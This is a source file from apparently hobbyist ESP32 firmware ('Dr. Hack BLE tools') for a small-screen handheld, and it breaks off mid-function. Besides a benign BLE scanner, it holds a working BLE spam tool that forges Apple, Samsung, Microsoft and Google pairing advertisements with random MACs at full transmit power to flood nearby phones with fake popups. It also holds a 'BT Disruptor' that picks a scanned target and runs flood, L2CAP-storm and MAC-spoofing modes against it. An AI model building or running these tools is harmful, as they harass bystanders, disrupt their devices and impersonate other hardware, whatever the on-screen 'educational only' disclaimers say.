// ═══════════════════════════════════════════════════════════
// COMPANION OS v7.0 — DR. HACK: BLE TOOLS
// BLE Inspector, BLE Spam, BT Disruptor, iPhone Remote
// Adapted from ESP32-TOOLS-PRO for 160×128 ST7735R
// ═══════════════════════════════════════════════════════════
#ifndef DH_BLE_TOOLS_H
#define DH_BLE_TOOLS_H

#ifdef ESP32

#include "globals.h"
#include "ui_components.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <BLEClient.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <BLEHIDDevice.h>
#include <HIDKeyboardTypes.h>

// ═══════════════════════════════════════════════════════════
// TOOL: BLE Inspector — Enhanced scan with service UUIDs
// ═══════════════════════════════════════════════════════════

#define DH_BII_MAX 20
#define DH_BII_VIS 5

struct DH_BiiDevice {
  String name, address;
  int rssi;
  uint16_t companyId;
  String appearance;
  int serviceCount;
};

static DH_BiiDevice dhBiiDevs[DH_BII_MAX];
static int dhBiiCount = 0;
static int dhBiiCursor = 0, dhBiiScroll = 0;

static String dhBiiCompanyName(uint16_t id) {
  switch (id) {
    case 0x004C: return "Apple";
    case 0x0075: return "Samsung";
    case 0x0006: return "Microsoft";
    case 0x00E0: return "Google";
    case 0x0059: return "Nordic";
    case 0x000D: return "TI";
    case 0x001D: return "Qualcomm";
    case 0x0046: return "Sony";
    case 0x0087: return "Garmin";
    case 0x0157: return "Xiaomi";
    case 0x038F: return "JBL";
    case 0x0310: return "Bose";
    default: return id != 0xFFFF ? "0x" + String(id, HEX) : "N/A";
  }
}

static String dhBiiAppearanceName(uint16_t app) {
  switch (app) {
    case 0x0000: return "Unknown";
    case 0x0040: return "Phone";
    case 0x0080: return "Computer";
    case 0x00C0: return "Watch";
    case 0x00C1: return "SportWatch";
    case 0x0180: return "Display";
    case 0x01C0: return "RemoteCtrl";
    case 0x0200: return "Glasses";
    case 0x0240: return "Tag";
    case 0x0280: return "Keyring";
    case 0x03C0: return "HID";
    case 0x03C1: return "Keyboard";
    case 0x03C2: return "Mouse";
    case 0x03C4: return "Gamepad";
    case 0x0440: return "BPMonitor";
    case 0x0480: return "Thermometer";
    case 0x04C0: return "HeartRate";
    case 0x0540: return "Glucose";
    case 0x0CC0: return "Hearing Aid";
    default: return "0x" + String(app, HEX);
  }
}

static void dhBiiDrawList() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), 0x001F, darkenColor(0x001F, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  char hdr[20]; sprintf(hdr, "BLE INSP [%d]", dhBiiCount);
  tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

  if (dhBiiCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No BLE devices", SCR_CX, SCR_CY, 1);
    return;
  }

  int listY = SCALE_Y(18), rowH = SCALE_Y(20);
  for (int i = 0; i < DH_BII_VIS; i++) {
    int idx = i + dhBiiScroll;
    if (idx >= dhBiiCount) break;
    int y = listY + i * rowH;
    bool sel = (idx == dhBiiCursor);
    DH_BiiDevice& d = dhBiiDevs[idx];

    if (sel) { tft.fillRect(0, y, SCR_W, rowH-1, CLR_SURFACE_2); tft.drawRect(0, y, SCR_W, rowH-1, CLR_PRIMARY); }

    String label = d.name.length() > 0 ? d.name : d.address;
    tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
    drawTruncatedText(SCALE_X(4), y + SCALE_Y(1), label.c_str(), SCALE_X(85), sel ? CLR_TEXT_HI : CLR_TEXT_MED, 1);

    char rssi[10]; sprintf(rssi, "%ddB", d.rssi);
    tft.setTextColor(d.rssi > -65 ? CLR_SUCCESS : CLR_WARNING);
    tft.drawString(rssi, SCR_W - SCALE_X(28), y + SCALE_Y(1), 1);

    String company = dhBiiCompanyName(d.companyId);
    tft.setTextColor(CLR_TEXT_LO);
    drawTruncatedText(SCALE_X(4), y + SCALE_Y(10), company.c_str(), SCALE_X(60), CLR_TEXT_LO, 1);

    char svcs[10]; sprintf(svcs, "S:%d", d.serviceCount);
    tft.drawString(svcs, SCR_W - SCALE_X(28), y + SCALE_Y(10), 1);
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("</>:Scrl SEL:Detail", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhBiiDrawDetail(int idx) {
  DH_BiiDevice& d = dhBiiDevs[idx];
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), 0x001F, darkenColor(0x001F, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("DEVICE INFO", SCALE_X(4), SCALE_Y(2), 1);

  int y = SCALE_Y(20);
  int lineH = SCALE_Y(12);

  // Name
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("Name:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_HI);
  drawTruncatedText(SCALE_X(34), y, d.name.length() > 0 ? d.name.c_str() : "<unnamed>",
                    SCALE_X(100), CLR_TEXT_HI, 1);
  y += lineH;

  // MAC
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("MAC:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawString(d.address.c_str(), SCALE_X(28), y, 1);
  y += lineH;

  // RSSI
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("RSSI:", SCALE_X(4), y, 1);
  char rssi[12]; sprintf(rssi, "%ddBm", d.rssi);
  tft.setTextColor(d.rssi > -65 ? CLR_SUCCESS : CLR_WARNING);
  tft.drawString(rssi, SCALE_X(34), y, 1);
  y += lineH;

  // Manufacturer
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("Mfr:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawString(dhBiiCompanyName(d.companyId).c_str(), SCALE_X(28), y, 1);
  y += lineH;

  // Appearance
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("Type:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString(d.appearance.c_str(), SCALE_X(34), y, 1);
  y += lineH;

  // Services
  char svcs[16]; sprintf(svcs, "%d services", d.serviceCount);
  tft.setTextColor(CLR_TEXT_LO); tft.drawString("Svcs:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString(svcs, SCALE_X(34), y, 1);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);

  dhWaitSelectPress();
  delay(200);
}

static void dhRunBleInspector() {
  tft.fillScreen(CLR_BG);
  tft.setTextColor(0x001F);
  tft.drawCentreString("Scanning BLE...", SCR_CX, SCR_CY, 1);

  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  if (!scan) return;
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(80);

  BLEScanResults* results = scan->start(6, false);
  int n = results->getCount();
  dhBiiCount = 0;

  for (int i = 0; i < n && dhBiiCount < DH_BII_MAX; i++) {
    BLEAdvertisedDevice d = results->getDevice(i);
    DH_BiiDevice& out = dhBiiDevs[dhBiiCount++];
    out.name = d.haveName() ? String(d.getName().c_str()) : "";
    out.address = String(d.getAddress().toString().c_str());
    out.rssi = d.getRSSI();
    out.companyId = 0xFFFF;
    if (d.haveManufacturerData()) {
      String data = d.getManufacturerData();
      if (data.length() >= 2) {
        out.companyId = (uint8_t)data[0] | ((uint16_t)(uint8_t)data[1] << 8);
      }
    }
    out.appearance = d.haveAppearance() ? dhBiiAppearanceName(d.getAppearance()) : "Unknown";
    out.serviceCount = d.getServiceUUIDCount();
  }

  scan->clearResults();

  // Sort by RSSI
  for (int i = 0; i < dhBiiCount - 1; i++)
    for (int j = 0; j < dhBiiCount - 1 - i; j++)
      if (dhBiiDevs[j].rssi < dhBiiDevs[j+1].rssi) {
        DH_BiiDevice tmp = dhBiiDevs[j]; dhBiiDevs[j] = dhBiiDevs[j+1]; dhBiiDevs[j+1] = tmp;
      }

  dhBiiCursor = 0; dhBiiScroll = 0;
  dhBiiDrawList();

  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      dhBiiCursor = (dhBiiCursor + dhBiiCount - 1) % max(dhBiiCount, 1);
      if (dhBiiCursor < dhBiiScroll) dhBiiScroll = dhBiiCursor;
      if (dhBiiCursor >= dhBiiScroll + DH_BII_VIS) dhBiiScroll = dhBiiCursor - DH_BII_VIS + 1;
      dhBiiDrawList(); delay(180);
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      dhBiiCursor = (dhBiiCursor + 1) % max(dhBiiCount, 1);
      if (dhBiiCursor < dhBiiScroll) dhBiiScroll = dhBiiCursor;
      if (dhBiiCursor >= dhBiiScroll + DH_BII_VIS) dhBiiScroll = dhBiiCursor - DH_BII_VIS + 1;
      dhBiiDrawList(); delay(180);
    }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else {
      if (holding && millis() - holdStart < 800 && dhBiiCount > 0) {
        dhBiiDrawDetail(dhBiiCursor);
        dhBiiDrawList();
      }
      holding = false;
    }
    delay(10);
  }
  BLEDevice::deinit(false);
}

// ═══════════════════════════════════════════════════════════
// TOOL: BLE Spam — Apple/Samsung/Microsoft/Google/Chaos
// ═══════════════════════════════════════════════════════════

enum DH_SpamMode { SP_APPLE=0, SP_SAMSUNG=1, SP_MICROSOFT=2, SP_GOOGLE=3, SP_CHAOS=4 };

static const char* DH_SPAM_NAMES[] = {
  "Apple iOS", "Samsung", "Microsoft", "Google", "CHAOS ALL"
};

struct DH_AppleModel { uint8_t prod[2]; const char* name; };
static const DH_AppleModel DH_APPLE_MODELS[] = {
  {{0x0E,0x20},"AirPods Pro"}, {{0x0A,0x20},"AirPods"},
  {{0x0B,0x20},"AirPods Max"}, {{0x05,0x20},"AirPods 2"},
  {{0x13,0x20},"AirPods 3"},   {{0x14,0x20},"AirPods Pro 2"},
  {{0x06,0x20},"Beats Solo3"}, {{0x09,0x20},"BeatsX"},
  {{0x0C,0x20},"Beats Flex"},  {{0x11,0x20},"Beats Studio"},
  {{0x16,0x20},"PB Pro"},      {{0x17,0x20},"Beats Fit"}
};
#define DH_APPLE_COUNT (sizeof(DH_APPLE_MODELS)/sizeof(DH_AppleModel))

struct DH_SamsungModel { uint8_t id[2]; const char* name; };
static const DH_SamsungModel DH_SAMSUNG_MODELS[] = {
  {{0x83,0xE0},"Buds Live"}, {{0x80,0xE0},"Buds+"},
  {{0x2C,0xE1},"Buds 2"},   {{0x40,0xE1},"Buds 2 Pro"},
  {{0x05,0xE1},"Buds Pro"},  {{0x1F,0xE0},"Buds"},
  {{0xA3,0xE1},"Buds FE"}
};
#define DH_SAMSUNG_COUNT (sizeof(DH_SAMSUNG_MODELS)/sizeof(DH_SamsungModel))

static const char* DH_MS_NAMES[] = { "Surface KB", "Surface Mouse", "Surface HP", "Xbox Ctrl", "Surface Pen" };
#define DH_MS_COUNT 5

struct DH_GoogleModel { uint8_t id[3]; const char* name; };
static const DH_GoogleModel DH_GOOGLE_MODELS[] = {
  {{0xCD,0x82,0x56},"Pixel Buds"}, {{0x00,0x00,0x47},"Pixel Buds A"},
  {{0xF5,0x2E,0x41},"Bose NC700"}, {{0x0E,0x0B,0x09},"JBL Live650"},
  {{0x14,0x00,0x45},"Sony XM4"},   {{0x00,0x00,0x44},"Nest"}
};
#define DH_GOOGLE_COUNT (sizeof(DH_GOOGLE_MODELS)/sizeof(DH_GoogleModel))

static volatile unsigned long dhSpamPkts = 0;
static String dhSpamCurrent = "";

static void dhSpamRandomMac() {
  esp_bd_addr_t mac;
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
  mac[0] |= 0xC0;
  esp_ble_gap_set_rand_addr(mac);
}

static void dhSpamSendApple(BLEAdvertising* adv) {
  int idx = random(0, DH_APPLE_COUNT);
  dhSpamCurrent = String(DH_APPLE_MODELS[idx].name);
  uint8_t pkt[31] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01,
    DH_APPLE_MODELS[idx].prod[0], DH_APPLE_MODELS[idx].prod[1], 0x55 };
  for (int i = 10; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
  BLEAdvertisementData d; d.addData((char*)pkt, 31);
  adv->setAdvertisementData(d);
}

static void dhSpamSendSamsung(BLEAdvertising* adv) {
  int idx = random(0, DH_SAMSUNG_COUNT);
  dhSpamCurrent = String(DH_SAMSUNG_MODELS[idx].name);
  uint8_t pkt[27] = { 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03,
    0x21, 0x01, 0x09, DH_SAMSUNG_MODELS[idx].id[0], DH_SAMSUNG_MODELS[idx].id[1],
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  BLEAdvertisementData d; d.addData((char*)pkt, 27);
  adv->setAdvertisementData(d);
}

static void dhSpamSendMS(BLEAdvertising* adv) {
  int idx = random(0, DH_MS_COUNT);
  dhSpamCurrent = String(DH_MS_NAMES[idx]);
  uint8_t nameLen = strlen(DH_MS_NAMES[idx]);
  if (nameLen > 20) nameLen = 20;
  uint8_t pkt[31]; int p = 0;
  pkt[p++]=0x03; pkt[p++]=0x03; pkt[p++]=0x2C; pkt[p++]=0xFE;
  pkt[p++]=0x06+nameLen; pkt[p++]=0xFF; pkt[p++]=0x06; pkt[p++]=0x00;
  pkt[p++]=0x03; pkt[p++]=0x00; pkt[p++]=0x80;
  memcpy(&pkt[p], DH_MS_NAMES[idx], nameLen); p += nameLen;
  BLEAdvertisementData d; d.addData((char*)pkt, p);
  adv->setAdvertisementData(d);
}

static void dhSpamSendGoogle(BLEAdvertising* adv) {
  int idx = random(0, DH_GOOGLE_COUNT);
  dhSpamCurrent = String(DH_GOOGLE_MODELS[idx].name);
  uint8_t pkt[14] = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE,
    DH_GOOGLE_MODELS[idx].id[0], DH_GOOGLE_MODELS[idx].id[1], DH_GOOGLE_MODELS[idx].id[2] };
  BLEAdvertisementData d; d.addData((char*)pkt, 14);
  adv->setAdvertisementData(d);
}

static void dhSpamSend(BLEAdvertising* adv, DH_SpamMode mode) {
  DH_SpamMode eff = (mode == SP_CHAOS) ? (DH_SpamMode)random(0, 4) : mode;
  dhSpamRandomMac();
  switch (eff) {
    case SP_APPLE: dhSpamSendApple(adv); break;
    case SP_SAMSUNG: dhSpamSendSamsung(adv); break;
    case SP_MICROSOFT: dhSpamSendMS(adv); break;
    case SP_GOOGLE: dhSpamSendGoogle(adv); break;
    default: break;
  }
}

static void dhRunBleSpam() {
  // Disclaimer
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("BLE SPAM", SCR_CX, SCALE_Y(8), 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawCentreString("Sends fake BLE", SCR_CX, SCALE_Y(30), 1);
  tft.drawCentreString("pairing popups!", SCR_CX, SCALE_Y(42), 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("Educational only!", SCR_CX, SCALE_Y(60), 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL:Accept <:Cancel", SCALE_X(2), SCR_H - SCALE_Y(12), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    delay(20);
  }

  // Mode selection
  int cursor = 0;
  auto drawMenu = [&]() {
    tft.fillScreen(CLR_BG);
    drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 50), 0);
    tft.setTextColor(CLR_TEXT_HI);
    tft.drawString("BLE SPAM MODE", SCALE_X(4), SCALE_Y(2), 1);

    for (int i = 0; i < 5; i++) {
      int y = SCALE_Y(18) + i * SCALE_Y(18);
      bool sel = (i == cursor);
      if (sel) { tft.fillRect(0, y, SCR_W, SCALE_Y(16), CLR_SURFACE_2); }
      tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
      tft.drawString(DH_SPAM_NAMES[i], SCALE_X(8), y + SCALE_Y(2), 1);
    }
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("</>:Sel SEL:Go", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
  };

  drawMenu();
  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { cursor = (cursor+4) % 5; drawMenu(); delay(180); }
    if (digitalRead(BTN_RIGHT) == LOW) { cursor = (cursor+1) % 5; drawMenu(); delay(180); }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) return;
    } else {
      if (holding && millis() - holdStart < 800) break;
      holding = false;
    }
    delay(20);
  }

  DH_SpamMode mode = (DH_SpamMode)cursor;

  // Attack loop
  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer* server = BLEDevice::createServer();
  BLEAdvertising* adv = server->getAdvertising();
  adv->setMinInterval(0x20);
  adv->setMaxInterval(0x40);

  dhSpamPkts = 0;
  unsigned long startMs = millis(), lastDraw = 0, lastPkt = 0;
  unsigned long lastPktCount = 0;
  float rate = 0;
  holdStart = 0; holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if (millis() - lastPkt > 20) {
      adv->stop();
      dhSpamSend(adv, mode);
      adv->start();
      dhSpamPkts++;
      lastPkt = millis();
    }

    if (millis() - lastDraw > 300) {
      unsigned long dt = millis() - lastDraw;
      unsigned long dp = dhSpamPkts - lastPktCount;
      rate = (dp * 1000.0f) / dt;
      lastPktCount = dhSpamPkts;

      tft.fillScreen(CLR_BG);
      tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
      tft.setTextColor(CLR_SECONDARY);
      tft.drawString("SPAM: " + String(DH_SPAM_NAMES[mode]), SCALE_X(4), SCALE_Y(3), 1);
      tft.setTextColor(CLR_SUCCESS);
      tft.drawString("[ACTIVE]", SCR_W - SCALE_X(44), SCALE_Y(3), 1);

      char buf[32];
      sprintf(buf, "Packets: %lu", dhSpamPkts);
      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(4), SCALE_Y(22), 1);
      tft.setTextColor(CLR_WARNING);
      drawTruncatedText(SCALE_X(4), SCALE_Y(38), dhSpamCurrent.c_str(), SCR_W - SCALE_X(8), CLR_WARNING, 1);
      sprintf(buf, "Rate: %d pkt/s", (int)rate);
      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(4), SCALE_Y(54), 1);

      int barW = random(10, SCR_W - SCALE_X(8));
      tft.fillRect(SCALE_X(4), SCALE_Y(72), SCR_W - SCALE_X(8), SCALE_Y(4), CLR_SURFACE);
      tft.fillRect(SCALE_X(4), SCALE_Y(72), barW, SCALE_Y(4), CLR_SECONDARY);

      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString("HOLD SEL: stop", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
      lastDraw = millis();
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 600) break;
    } else { holding = false; }

    delay(5);
  }

  adv->stop();
  BLEDevice::deinit(false);
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: BT Disruptor — Targeted BLE device disruption
// ═══════════════════════════════════════════════════════════

enum DH_AtkMode { ATK_FLOOD=0, ATK_L2CAP=1, ATK_SPOOF=2, ATK_ALLCHAOS=3 };
static const char* DH_ATK_NAMES[] = { "Connect Flood", "L2CAP Storm", "Spoof ID", "Chaos All" };

#define DH_DTG_MAX 20
#define DH_DTG_VIS 5

struct DH_DisruptTarget {
  String name, mac;
  uint8_t macBytes[6];
  int rssi;
};

static DH_DisruptTarget dhDtgTargets[DH_DTG_MAX];
static int dhDtgCount = 0;

static void dhDtgParseMac(const String& mac, uint8_t out[6]) {
  for (int i = 0; i < 6; i++) {
    String hex = mac.substring(i * 3, i * 3 + 2);
    out[i] = (uint8_t)strtol(hex.c_str(), nullptr, 16);
  }
}

static volatile unsigned long dhDtgPkts = 0;
static DH_DisruptTarget dhDtgActive;
static DH_AtkMode dhDtgMode;

static void dhDtgUpdateFlood(BLEAdvertising* adv) {
  uint8_t pkt[31];
  pkt[0]=0x02; pkt[1]=0x01; pkt[2]=0x06; pkt[3]=0x07; pkt[4]=0x03;
  for (int i = 5; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
  pkt[10]=dhDtgActive.macBytes[0]; pkt[11]=dhDtgActive.macBytes[1]; pkt[12]=dhDtgActive.macBytes[2];
  BLEAdvertisementData d; d.addData((char*)pkt, 31);
  adv->setAdvertisementData(d);
}

static void dhDtgUpdateL2CAP(BLEAdvertising* adv) {
  uint8_t pkt[31]; pkt[0]=0x1E; pkt[1]=0xFF; pkt[2]=0x5A; pkt[3]=0x5A;
  pkt[4]=0x01; pkt[5]=0x00; pkt[6]=0x02; pkt[7]=0x00;
  for (int i = 8; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
  pkt[20]=dhDtgActive.macBytes[3]; pkt[21]=dhDtgActive.macBytes[4]; pkt[22]=dhDtgActive.macBytes[5];
  BLEAdvertisementData d; d.addData((char*)pkt, 31);
  adv->setAdvertisementData(d);
}

static void dhDtgUpdateSpoof(BLEAdvertising* adv) {
  esp_bd_addr_t spoofMac;
  memcpy(spoofMac, dhDtgActive.macBytes, 6);
  esp_ble_gap_set_rand_addr(spoofMac);
  uint8_t pkt[31]; pkt[0]=0x02; pkt[1]=0x01; pkt[2]=0x06; pkt[3]=0x03; pkt[4]=0x09; pkt[5]=0x54; pkt[6]=0x47;
  for (int i = 7; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
  BLEAdvertisementData d; d.addData((char*)pkt, 31);
  adv->setAdvertisementData(d);
}

static void dhDtgRandomMac() {
  esp_bd_addr_t mac;
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
  mac[0] |= 0xC0;
  esp_ble_gap_set_rand_addr(mac);
}

static void dhRunBtDisruptor() {
  // Disclaimer
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("BT DISRUPTOR", SCR_CX, SCALE_Y(8), 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawCentreString("Targets a BLE", SCR_CX, SCALE_Y(30), 1);
  tft.drawCentreString("device to disrupt.", SCR_CX, SCALE_Y(42), 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("OWN devices only!", SCR_CX, SCALE_Y(60), 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL:Accept <:Cancel", SCALE_X(2), SCR_H - SCALE_Y(12), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    delay(20);
  }

  // Scan BLE targets
  BLEDevice::init("");
  tft.fillScreen(CLR_BG);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("Scanning BLE 5s...", SCR_CX, SCR_CY, 1);

  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true); scan->setInterval(100); scan->setWindow(99);
  BLEScanResults* results = scan->start(5, false);
  int n = results->getCount();
  dhDtgCount = 0;

  for (int i = 0; i < n && dhDtgCount < DH_DTG_MAX; i++) {
    BLEAdvertisedDevice d = results->getDevice(i);
    DH_DisruptTarget& t = dhDtgTargets[dhDtgCount++];
    t.name = d.haveName() ? String(d.getName().c_str()) : "";
    t.mac = String(d.getAddress().toString().c_str());
    t.rssi = d.getRSSI();
    dhDtgParseMac(t.mac, t.macBytes);
  }
  scan->clearResults();

  // Sort by RSSI
  for (int i = 0; i < dhDtgCount - 1; i++)
    for (int j = 0; j < dhDtgCount - 1 - i; j++)
      if (dhDtgTargets[j].rssi < dhDtgTargets[j+1].rssi) {
        DH_DisruptTarget tmp = dhDtgTargets[j]; dhDtgTargets[j] = dhDtgTargets[j+1]; dhDtgTargets[j+1] = tmp;
      }

  if (dhDtgCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No devices", SCR_CX, SCR_CY, 1);
    delay(2000);
    BLEDevice::deinit(false);
    return;
  }

  // Select target
  int sel = 0, scroll = 0;
  auto drawTgtList = [&]() {
    tft.fillScreen(CLR_BG);
    drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 50), 0);
    tft.setTextColor(CLR_TEXT_HI);
    char hdr[20]; sprintf(hdr, "TARGETS [%d]", dhDtgCount);
    tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

    int listY = SCALE_Y(18), rowH = SCALE_Y(20);
    for (int i = 0; i < DH_DTG_VIS; i++) {
      int idx = i + scroll;
      if (idx >= dhDtgCount) break;
      int y = listY + i * rowH;
      bool s = (idx == sel);
      if (s) { tft.fillRect(0, y, SCR_W, rowH-1, CLR_SURFACE_2); }
      String label = dhDtgTargets[idx].name.length() > 0 ? dhDtgTargets[idx].name : dhDtgTargets[idx].mac;
      tft.setTextColor(s ? CLR_TEXT_HI : CLR_TEXT_MED);
      drawTruncatedText(SCALE_X(4), y + SCALE_Y(1), label.c_str(), SCALE_X(85), s ? CLR_TEXT_HI : CLR_TEXT_MED, 1);
      char rssi[10]; sprintf(rssi, "%ddB", dhDtgTargets[idx].rssi);
      tft.setTextColor(CLR_TEXT_LO); tft.drawString(rssi, SCR_W - SCALE_X(28), y + SCALE_Y(5), 1);
    }
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("</>:Scrl SEL:Pick", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
  };

  drawTgtList();
  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      sel = (sel + dhDtgCount - 1) % dhDtgCount;
      if (sel < scroll) scroll = sel;
      if (sel >= scroll + DH_DTG_VIS) scroll = sel - DH_DTG_VIS + 1;
      drawTgtList(); delay(180);
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      sel = (sel + 1) % dhDtgCount;
      if (sel < scroll) scroll = sel;
      if (sel >= scroll + DH_DTG_VIS) scroll = sel - DH_DTG_VIS + 1;
      drawTgtList(); delay(180);
    }
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) { BLEDevice::deinit(false); return; }
    } else {
      if (holding && millis() - holdStart < 800) break;
      holding = false;
    }
    delay(20);
  }

  dhDtgActive = dhDtgTargets[sel];

  // Select attack mode
  int atkSel = 0;
  auto drawAtkMenu = [&]() {
    tft.fillScreen(CLR_BG);
    drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 50), 0);
    tft.setTextColor(CLR_TEXT_HI);
    tft.drawString("ATTACK MODE", SCALE_X(4), SCALE_Y(2), 1);

    String tName = dhDtgActive.name.length() > 0 ? dhDtgActive.name : dhDtgActive.mac;
    tft.setTextColor(CLR_WARNING);
    drawTruncatedText(SCALE_X(4), SCALE_Y(16), tName.c_str(), SCR_W - SCALE_X(8), CLR_WARNING, 1);

    for (int i = 0; i < 4; i++) {
      int y = SCALE_Y(30) + i * SCALE_Y(18);
      bool s = (i == atkSel);
      if (s) tft.fillRect(0, y, SCR_W, SCALE_Y(16), CLR_SURFACE_2);
      tft.setTextColor(s ? CLR_TEXT_HI : CLR_TEXT_MED);
      tft.drawString(DH_ATK_NAMES[i], SCALE_X(8), y + SCALE_Y(2), 1);
    }
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("</>:Sel SEL:Start", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
  };

  drawAtkMenu();
  holdStart = 0; holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { atkSel = (atkSel+3) % 4; drawAtkMenu(); delay(180); }
    if (digitalRead(BTN_RIGHT) == LOW) { atkSel = (atkSel+1) % 4; drawAtkMenu(); delay(180); }
